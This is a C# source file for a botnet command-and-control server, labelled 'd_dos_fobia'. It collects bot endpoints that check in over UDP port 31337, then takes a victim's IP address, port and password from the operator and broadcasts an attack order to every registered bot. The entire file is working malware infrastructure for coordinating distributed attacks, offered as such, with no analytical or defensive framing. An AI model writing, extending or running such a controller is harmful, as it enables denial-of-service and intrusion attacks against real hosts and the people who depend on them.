using System;
using System.Net;      //required
using System.Net.Sockets;    //required
using System.Threading;
using System.Collections.Generic;
using System.Text;

namespace Server
{
	public class Program
	{
		private static HashSet<IPEndPoint> ip_port_bots = new HashSet<IPEndPoint>();

		private static string GetLocalIPAddress()
		{
			IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		public static void Main(string[] args)
		{
			Console.WriteLine("Command and control server d_dos_fobia active");
			UdpClient udpServer = new UdpClient(31337);
			Thread listenThread = new Thread(() =>
			{
				while (true)
				{
					IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 31337);
					byte[] data = udpServer.Receive(ref remoteEP); // listen on port 31337
																   //Console.WriteLine(BitConverter.ToInt32(data, 0));
																   //Console.WriteLine("data " + remoteEP.ToString());
					lock (ip_port_bots) ip_port_bots.Add(new IPEndPoint(remoteEP.Address, BitConverter.ToUInt16(data, 0)));
					//DisplaySet(ip_port_bots);
					//udpServer.Send(new byte[] { 1 }, 1, remoteEP); // reply back
				}
			});
			listenThread.Start();
			while (true)
			{
				try
				{
					Console.WriteLine("ip?");
					string ip_vic = Console.ReadLine();

					Console.WriteLine("port?");
					int port_vic = Int32.Parse(Console.ReadLine());
					Console.WriteLine("password?");
					string pass_vic = Console.ReadLine();

					byte[] ip_vic_arr = IPAddress.Parse(ip_vic).GetAddressBytes(), //BitConverter.GetBytes((Int32)IPAddress.Parse(ip_vic).Address),
					port_vic_arr = BitConverter.GetBytes((Int16)port_vic),
						pass_vic_arr = Encoding.Default.GetBytes(pass_vic);
					string name = "d_dos_fobia";
					int len = name.Length;
					for (int i = 0; i < 32 - len; i++)
						name = name + "\0";
					byte[] name_vic_arr = Encoding.Default.GetBytes(name);

					byte[] to_send = Combine(ip_vic_arr, port_vic_arr, pass_vic_arr, name_vic_arr);

					Console.WriteLine("attacking victim on IP " + ip_vic + ", port " + port_vic + " with " + ip_port_bots.Count + " bots");
					DisplaySet(ip_port_bots);
					try
					{
						lock (ip_port_bots)
						{
							foreach (IPEndPoint endPoint in ip_port_bots)
							{
								udpServer.Send(to_send, to_send.Length, endPoint); // reply back
							}
						}
					}
					catch (Exception e)
					{
						Console.WriteLine(e.Message);
					}
				}
				catch(Exception e) {
					Console.WriteLine("incorecct input " + e.Message);
				}
			}
		}


		private static void DisplaySet(HashSet<IPEndPoint> set)
		{
			Console.Write("{ ");
			foreach (IPEndPoint endPoint in set)
			{
				Console.Write(endPoint.ToString() + ", ");
			}
			Console.WriteLine(" }");
		}

		private static byte[] Combine(byte[] first, byte[] second, byte[] third, byte[] fourth)
		{
			byte[] ret = new byte[first.Length + second.Length + third.Length + fourth.Length];
			Buffer.BlockCopy(first, 0, ret, 0, first.Length);
			Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
			Buffer.BlockCopy(third, 0, ret, first.Length + second.Length,
							 third.Length);
			Buffer.BlockCopy(fourth, 0, ret, first.Length + second.Length + third.Length,
							 fourth.Length);
			return ret;
		}
	}
}